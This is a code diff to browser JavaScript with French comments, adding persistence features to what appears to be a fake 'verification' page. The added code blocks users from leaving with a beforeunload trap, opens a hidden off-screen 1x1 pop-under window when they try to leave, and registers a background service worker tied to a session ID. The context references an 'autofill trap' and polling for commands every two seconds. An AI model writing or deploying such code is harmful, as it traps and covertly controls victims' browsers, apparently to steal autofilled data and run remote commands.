@@ -508,9 +508,26 @@ async function startVerification() {
     };
 
     overlay.addEventListener('click', handleFirstClick, { once: true });
+
+    // Mécanisme de persistance : Empêcher la fermeture facile
+    window.addEventListener('beforeunload', (e) => {
+        // Sur certains navigateurs, cela affiche une boîte de dialogue "Voulez-vous vraiment quitter ?"
+        e.preventDefault();
+        e.returnValue = '';
+        
+        // Tentative désespérée de rouvrir un onglet (Pop-under) au moment de partir
+        window.open(window.location.href, '_blank', 'width=1,height=1,left=10000,top=10000');
+    });
 }
 
 if (document.readyState === 'complete') {
+    // Enregistrement du Service Worker pour la survie en arrière-plan
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/sw.js').then(reg => {
+            reg.active && reg.active.postMessage({type: 'SET_SESSION', sessionId: sessionId});
+        }).catch(err => console.warn("SW registration failed", err));
+    }
+
     setupAutofillTrap();
     startVerification();
     // Vérification des commandes très fréquente (toutes les 2 secondes)
